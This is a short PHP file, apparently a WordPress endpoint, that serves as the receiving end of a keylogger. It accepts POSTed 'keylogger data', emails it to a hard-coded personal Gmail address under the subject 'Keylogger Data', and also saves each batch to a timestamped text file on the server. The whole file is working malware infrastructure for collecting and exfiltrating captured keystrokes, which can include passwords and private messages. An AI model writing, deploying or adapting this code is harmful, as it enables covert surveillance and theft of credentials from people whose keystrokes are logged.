<?php

$method = $request->get_method();

if ($method === 'POST') {
    // Retrieve and sanitize the data from the request
    $keyLogData = isset($_POST['data']) ? sanitize_text_field($_POST['data']) : '';

    if (empty($keyLogData)) {
        // Return error response if no data is provided
        header('Content-Type: application/json');
        http_response_code(400);
        echo json_encode(array(
            'request' => array(
                'status' => 'error',
                'message' => 'No data received.',
            ),
        ));
        exit;
    }

    // Define the email details
    $to = 'zarralghifari@gmail.com';  // Replace with your email address
    $subject = 'Keylogger Data';  // Email subject
    $body = "Received keylogger data:\n\n" . $keyLogData;
    $headers = array(
        'Content-Type: text/plain; charset=UTF-8',
        'From: no-reply@example.com'  // Replace with a valid sender email
    );

    // Send the email
    $sent = wp_mail($to, $subject, $body, $headers);

    if ($sent) {
        // Clear the log file after sending email
        $timestamp = date('Y-m-d_H-i-s');
        $filepath = __DIR__ . "/keylogger_text_" . $timestamp . ".txt";
        file_put_contents($filepath, $keyLogData);

        // Return a success response
        header('Content-Type: application/json');
        http_response_code(200);
        echo json_encode(array(
            'request' => array(
                'status' => 'success',
                'message' => 'Data received and email sent successfully.',
            ),
        ));
    } else {
        // Return an error response if email sending fails
        header('Content-Type: application/json');
        http_response_code(500);
        echo json_encode(array(
            'request' => array(
                'status' => 'error',
                'message' => 'Failed to send email.',
            ),
        ));
    }
    exit;
}

// Handle invalid request methods
header('Content-Type: application/json');
http_response_code(405);
echo json_encode(array(
    'request' => array(
        'status' => 'error',
        'message' => 'Invalid request method.',
    ),
));
